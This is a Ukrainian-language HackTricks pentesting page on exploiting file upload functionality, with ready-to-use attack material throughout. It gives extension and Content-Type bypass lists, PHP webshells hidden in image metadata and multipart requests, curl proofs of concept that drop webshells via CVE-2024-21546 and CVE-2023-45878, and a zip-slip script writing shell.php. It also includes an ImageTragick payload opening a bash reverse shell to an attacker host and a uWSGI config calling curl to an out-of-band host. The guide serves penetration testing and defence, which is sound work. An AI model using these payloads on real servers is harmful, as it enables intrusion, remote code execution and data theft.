# Завантаження файлів

{{#include ../../banners/hacktricks-training.md}}

## Загальна методологія завантаження файлів

Інші корисні розширення:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Робота в PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Обхід перевірок розширень файлів

1. Якщо вони застосовуються, **перевірте** **попередні розширення.** Також протестуйте їх, використовуючи великі літери: _pHp, .pHP5, .PhAr ..._
2. _Перевірте **додавання валідного розширення перед** виконавчим розширенням (також використовуйте попередні розширення):_
- _file.png.php_
- _file.png.Php5_
3. Спробуйте додати **спеціальні символи в кінці.** Можна використати Burp щоб **bruteforce** пройти всі **ascii** та **Unicode** символи. (_Зауваження: ви також можете спробувати використати **вже згадані** розширення_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Спробуйте обійти захист, **обдуривши парсер розширень** на серверній стороні за допомогою технік, як-от **подвоєння** **розширення** або **додавання сміттєвих** даних (**null** байтів) між розширеннями. _Ви також можете використати **попередні розширення** для підготовки кращого payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Додайте **ще один шар розширень** до попередньої перевірки:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Спробуйте помістити **виконувальне розширення перед валідним розширенням** та сподіватися на некоректну конфігурацію сервера. (корисно для експлуатації misconfigurations Apache, де будь-який файл з розширенням **.php**, але не обов'язково що закінчується на .php, може виконувати код):
- _ex: file.php.png_
7. Використання **NTFS alternate data stream (ADS)** у **Windows**. У цьому випадку після забороненого розширення і перед дозволеним буде вставлено двокрапку ":". У результаті створиться **порожній файл із забороненим розширенням** на сервері (наприклад "file.asax:.jpg"). Цей файл можна буде редагувати пізніше іншими техніками, наприклад використовуючи його коротке ім'я. Шаблон "**::$data**" також можна використати для створення непорожніх файлів. Тому додавання крапки після цього шаблону також може допомогти обійти подальші обмеження (наприклад "file.asp::$data.").
8. Спробуйте перевищити ліміти імені файлу. Валідне розширення обрізається, а шкідливий PHP залишається. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Деякі upload handlers обрізають або нормалізують трайлінг-крапки у збережених іменах файлів. В UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) версій до 2.9.1 можна обійти валідацію розширень шляхом:

- Використання валідного image MIME та magic header (наприклад PNG’s `\x89PNG\r\n\x1a\n`).
- Назвати завантажений файл з PHP-розширенням та крапкою наприкінці, наприклад `shell.php.`.
- Сервер обрізає трайлінг-крапку і зберігає `shell.php`, який виконається, якщо він буде у директорії, що обслуговується вебом (типовий public storage як `/storage/files/`).

Мінімальний PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Потім зробіть запит до збереженого шляху (типово для Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Оновіть unisharp/laravel-filemanager до ≥ 2.9.1.
- Застосуйте суворі server-side allowlists і повторно перевіряйте збережене ім'я файлу.
- Обслуговуйте завантаження з невиконуваних локацій.

### Обхід Content-Type, Magic Number, Compression & Resizing

- Обійти **Content-Type** перевірки, встановивши **value** заголовка **Content-Type** на: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Обійти перевірку **magic number**, додавши на початок файлу **байти реального зображення** (заплутати команду _file_). Або ввести шелл у **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` або ви також можете **ввести payload прямо** в зображення:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Якщо до вашого зображення додається **стиснення**, наприклад з використанням стандартних PHP-бібліотек типу [PHP-GD](https://www.php.net/manual/fr/book.image.php), попередні техніки можуть виявитися некорисними. Проте ви можете використати **PLTE chunk** [**техніку описану тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) щоб вставити текст, який **виживе після стиснення**.
- [**Github з кодом**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Веб-сторінка також може змінювати **розмір** зображення, використовуючи, наприклад, PHP-GD функції `imagecopyresized` або `imagecopyresampled`. Проте ви можете використати **IDAT chunk** [**техніку описану тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) щоб вставити текст, який **виживе після стиснення**.
- [**Github з кодом**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Інша техніка для створення payload, який **виживає при зміні розміру зображення**, використовуючи PHP-GD функцію `thumbnailImage`. Проте ви можете використати **tEXt chunk** [**техніку описану тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) щоб вставити текст, який **виживе після стиснення**.
- [**Github з кодом**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Інші прийоми для перевірки

- Знайдіть вразливість, яка дозволяє **перейменувати** вже завантажений файл (щоб змінити розширення).
- Знайдіть **Local File Inclusion** вразливість для виконання backdoor.
- **Можливе розкриття інформації**:
1. Завантажте **кілька разів** (і одночасно) **той самий файл** з **тим самим ім'ям**
2. Завантажте файл з **ім'ям** файлу або папки, яка **вже існує**
3. Завантаження файлу з ім'ям **"." , "..", або "…"**. Наприклад, в Apache на **Windows**, якщо додаток зберігає завантажені файли в директорії "/www/uploads/", ім'я файлу "." створить файл з ім'ям
uploads” в директорії "/www/".
4. Завантажте файл, який може бути важко видалити, такий як **"…:.jpg"** в **NTFS**. (Windows)
5. Завантажте файл в **Windows** з **недопустимими символами** в імені, такими як `|<>*?”`. (Windows)
6. Завантажте файл в **Windows** використовуючи зарезервовані (**заборонені**) імена, такі як CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, і LPT9.
- Спробуйте також завантажити виконуваний файл (.exe) або .html (менш підозрілий), який **виконає код**, коли випадково відкриється жертвою.

### Спеціальні хитрощі з розширеннями

Якщо ви намагаєтеся завантажити файли на **PHP** server, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Якщо ви намагаєтеся завантажити файли на **ASP** server, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Файли `.phar` подібні до `.jar` для java, але для php, і можуть бути **використані як php файл** (виконуючись за допомогою php, або включаючись всередині скрипту...)

Розширення `.inc` інколи використовується для php-файлів, що використовуються лише для **імпорту файлів**, тож іноді це розширення могло бути дозволено для **виконання**.

## **Jetty RCE**

Якщо ви можете завантажити XML файл на Jetty server, ви можете отримати [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Тому, як показано на зображенні нижче, завантажте XML файл до `$JETTY_BASE/webapps/` і чекайте шелл!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Для детального розгляду цієї вразливості перевірте оригінальне дослідження: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) вразливості можуть бути експлуатовані на uWSGI серверах, якщо є можливість змінити конфігураційний файл `.ini`. uWSGI конфігураційні файли використовують специфічний синтаксис для включення "magic" змінних, placeholder-ів та операторів. Зокрема, оператор '@', що використовується як `@(filename)`, призначений для включення вмісту файлу. Серед різних підтримуваних схем в uWSGI, схема "exec" особливо потужна, дозволяючи читати дані з stdout процесу. Цю можливість можна маніпулювати для шкідливих цілей, таких як Remote Command Execution або Arbitrary File Write/Read, коли обробляється `.ini` конфігураційний файл.

Розгляньте наступний приклад шкідливого `uwsgi.ini` файлу, що демонструє різні схеми:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Виконання payload відбувається під час розбору файлу конфігурації. Щоб конфігурація була активована і розібрана, процес uWSGI має бути або перезапущений (потенційно після крашу або через Denial of Service attack), або файл має бути налаштований на auto-reload. Функція auto-reload, якщо ввімкнена, перезавантажує файл через задані інтервали після виявлення змін.

Важливо розуміти поблажливий характер розбору файлу конфігурації uWSGI. Конкретно, обговорюваний payload може бути вставлений у бінарний файл (наприклад, зображення або PDF), що ще більше розширює можливі вектори експлуатації.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (сервер ігнорує type/name, base64-декодує кінцеву частину)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Мінімальний PoC для запису та подальшого читання файлу:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Розмістіть мінімальний webshell і виконайте команди:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Примітки:
- Обробник виконує `base64_decode($_POST["img"])` після розділення по `;` і `,`, а потім записує байти в `$absolutePath . '/' . $_POST['path']` без перевірки розширення/типу.
- Внаслідок цього код виконується від імені користувача web сервісу (наприклад, XAMPP Apache на Windows).

Посилання на цю уразливість включають usd HeroLab advisory і запис NVD. Див. розділ References нижче.

## **wget Завантаження файлів/SSRF Трюк**

В інколи може трапитися, що сервер використовує **`wget`** для **завантаження файлів** і ви можете **вказати** **URL**. В таких випадках код може перевіряти, що розширення завантажуваних файлів є у білому списку, щоб гарантувати, що будуть завантажені лише дозволені файли. Однак **цю перевірку можна обійти.**\
Максимальна довжина імені файлу в **linux** — **255** символів, проте **wget** обрізує імена файлів до **236** символів. Можна **завантажити файл з іменем "A"*232+".php"+".gif"**, це ім'я файлу **обійде** **перевірку** (в цьому прикладі **".gif"** є **допустимим** розширенням), але `wget` **перейменує** файл на **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Зверніть увагу, що **ще один варіант**, про який ви, можливо, думаєте, щоб обійти цю перевірку — це змусити **HTTP server redirect to a different file**, тож початковий URL може пройти перевірку, а потім wget завантажить перенаправлений файл під новим іменем. Це **не спрацює**, **якщо не** використовувати wget з параметром `--trust-server-names`, оскільки **wget will download the redirected page with the name of the file indicated in the original URL**.

## Інструменти

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) — потужний інструмент, створений, щоб допомогти Pentesters та Bug Hunters тестувати механізми завантаження файлів. Він використовує різні bug bounty techniques для спрощення процесу ідентифікації та експлуатації вразливостей, забезпечуючи ретельну оцінку web applications.

### Corrupting upload indices with snprintf quirks (historical)

Деякі застарілі upload handlers, які використовують `snprintf()` або подібні функції для побудови масивів multi-file з single-file upload, можна обдурити, щоб підробити структуру `_FILES`. Через невідповідності та усікання в поведінці `snprintf()`, ретельно сформований single upload може виглядати як кілька проіндексованих файлів на боці сервера, вводячи в оману логіку, яка припускає сувору форму (наприклад, трактуючи це як multi-file upload і переходячи в небезпечні гілки). Хоча сьогодні це нішова проблема, цей “index corruption” pattern час від часу з’являється в CTFs і в старих codebases.

## Від завантаження файлів до інших вразливостей

- Вкажіть **filename** як `../../../tmp/lol.png` та спробуйте досягти **path traversal**
- Вкажіть **filename** як `sleep(10)-- -.jpg` і ви можете досягти **SQL injection**
- Вкажіть **filename** як `<svg onload=alert(document.domain)>` для досягнення **XSS**
- Вкажіть **filename** як `; sleep 10;` щоб перевірити деякі **command injection** (більше [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Спробуйте **different svg payloads** з [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Якщо ви можете вказати web server, щоб він отримав зображення з URL, ви можете спробувати зловживати [SSRF](../ssrf-server-side-request-forgery/index.html). Якщо це **image** буде **saved** на якесь **public** місце, ви також можете вказати URL з [https://iplogger.org/invisible/](https://iplogger.org/invisible/) і **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Спеціально підготовлені PDFs для XSS: наступна сторінка показує, як **inject PDF data to obtain JS execution** (../xss-cross-site-scripting/pdf-injection.md). Якщо ви можете завантажувати PDFs, ви можете підготувати PDF, який виконуватиме довільний JS за наведеними інструкціями.
- Завантажте вміст \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) щоб перевірити, чи сервер має якийсь **antivirus**
- Перевірте, чи існує якийсь **size limit** при завантаженні файлів

Ось топ‑10 речей, які можна досягти завантаженням (з [тут](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Магічні байти заголовку

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Див. [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) для інших filetypes.

## Zip/Tar: автоматично розпаковані завантаження

Якщо ви можете завантажити ZIP, який буде розпакований на сервері, ви можете зробити 2 речі:

### Symlink

Завантажте архів, що містить символічні посилання (soft links) на інші файли — після доступу до розпакованих файлів ви отримаєте доступ до пов’язаних файлів:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Розпаковка в різні папки

Несподіване створення файлів у директоріях під час розпаковки є серйозною проблемою. Незважаючи на початкові припущення, що така настройка може захищати від OS-level command execution через malicious file uploads, підтримка ієрархічного стиснення та можливості directory traversal у ZIP archive format можуть бути використані. Це дозволяє attackers обходити обмеження і виходити з secure upload directories, маніпулюючи decompression functionality цільового застосунку.

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Утиліту можна використовувати як показано:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Крім того, варто розглянути **symlink trick with evilarc**. Якщо потрібно націлитися на файл, наприклад `/flag.txt`, слід створити symlink на цей файл у вашій системі. Це гарантує, що evilarc не зіткнеться з помилками під час своєї роботи.

Нижче наведено приклад Python-коду, який використовується для створення зловмисного zip-файлу:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Зловживання стисненням для file spraying**

Для додаткових відомостей **перегляньте оригінальний пост за адресою**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Створення PHP Shell**: Написано PHP-код, що виконує команди, передані через змінну `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying та створення стисненого файлу**: Створюються декілька файлів і збирається zip-архів, що містить ці файли.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Зміна за допомогою Hex Editor або vi**: Імена файлів всередині zip змінюються за допомогою vi або hex editor, замінюючи "xxA" на "../", щоб пройти в інші директорії.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Завантажте цей вміст з розширенням зображення, щоб експлуатувати уразливість **(ImageMagick , 7.0.1-1)** (з [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Вбудовування PHP shell у PNG

Вбудовування PHP shell у IDAT chunk PNG-файлу може ефективно обходити певні операції обробки зображень. Функції `imagecopyresized` та `imagecopyresampled` з PHP-GD особливо релевантні в цьому контексті, оскільки вони часто використовуються для зміни розміру та ресемплінгу зображень відповідно. Здатність вбудованого PHP shell залишатися неушкодженим під час цих операцій є значною перевагою для певних сценаріїв використання.

Детальне вивчення цієї техніки, включно з методологією та потенційними застосуваннями, наведено в наступній статті: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Цей ресурс дає комплексне розуміння процесу та його наслідків.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files слугують унікальним інструментом у cybersecurity, поводячись як хамелеони, які можуть одночасно бути дійсними в кількох форматах файлів. Цікавим прикладом є [GIFAR](https://en.wikipedia.org/wiki/Gifar), гібрид, який працює одночасно як GIF і RAR-архів. Такі файли не обмежуються цією парою; можливі й поєднання на кшталт GIF та JS або PPT та JS.

Основна користь polyglot файлів полягає в їхній здатності обходити заходи безпеки, які перевіряють файли за типом. Зазвичай у різних додатках дозволяють завантаження лише певних типів файлів — наприклад JPEG, GIF або DOC — щоб зменшити ризик від потенційно шкідливих форматів (наприклад, JS, PHP або Phar). Однак polyglot, відповідаючи структурним вимогам кількох форматів одночасно, може непомітно обійти ці обмеження.

Незважаючи на адаптивність, polygloty мають обмеження. Наприклад, хоча polyglot може одночасно містити PHAR файл (PHp ARchive) і JPEG, успішність його завантаження може залежати від політик платформи щодо розширень файлів. Якщо система суворо перевіряє дозволені розширення, сама структурна подвійність polyglot може бути недостатньою для гарантування завантаження.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Завантаження валідних JSON так, ніби це PDF

Як уникнути визначення типу файлу, завантажуючи валідний JSON-файл, навіть якщо це не дозволено, підробивши PDF-файл (техніки з **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Поки магічні байти `%PDF` знаходяться в перших 1024 байтах, файл вважається дійсним (див. приклад у пості)
- **`pdflib` library**: Додайте фейковий PDF всередину поля JSON так, щоб бібліотека вважала його PDF (див. приклад у пості)
- **`file` binary**: Воно може читати до 1048576 байт з файлу. Просто створіть JSON більший за це, щоб воно не змогло розпарсити вміст як JSON, а потім всередині JSON вставте початкову частину реального PDF — і воно вважатиме, що це PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
